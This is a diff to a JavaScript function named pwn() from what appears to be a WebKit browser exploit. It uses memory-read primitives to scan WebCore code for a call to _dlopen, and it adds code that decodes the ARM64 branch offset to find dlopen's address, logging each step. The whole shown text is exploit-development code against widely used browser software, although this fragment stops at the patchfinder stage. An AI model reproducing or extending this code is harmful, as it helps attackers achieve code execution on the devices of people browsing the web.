@@ -217,13 +217,14 @@ function pwn() {
     bl_dlopen_addr = Sub(bl_dlopen_addr, 0x105000);
 
     var try_count = 0;
+    var opcode;
     while (true) {
         if(try_count > 0x1000) {
             log(`[-] failed webkit patchfinder`);
             return;
         }
 
-        var opcode = read64(bl_dlopen_addr);
+        opcode = read64(bl_dlopen_addr);
 
         // WebCore:__text:000000018AF15D78 E9 03 00 32                             MOV             W9, #1
         // WebCore:__text:000000018AF15D7C 09 01 00 39                             STRB            W9, [X8]
@@ -241,7 +242,7 @@ function pwn() {
             return;
         }
 
-        var opcode = read32(bl_dlopen_addr);
+        opcode = read32(bl_dlopen_addr);
         if(((opcode & 0xFC000000) >>> 0)== 0x94000000)  //Is BL addr?
             break;
             
@@ -250,6 +251,16 @@ function pwn() {
         try_count++;
     }
     log(`[+] found bl _dlopen addr: ${bl_dlopen_addr}`);
+
+    // where to call?
+    // BL addr
+    var imm = (opcode & 0x3FFFFFF) << 2;
+    log(`[+] imm: ${imm}`);
+    if (opcode & 0x2000000) {
+        imm |= 0xf << 28;
+    }
+    var dlopen_addr = Add(bl_dlopen_addr, imm);
+    log(`[+] dlopen_addr: ${dlopen_addr}`);
 
     // remove this "return" if finished patchfinder
     return;
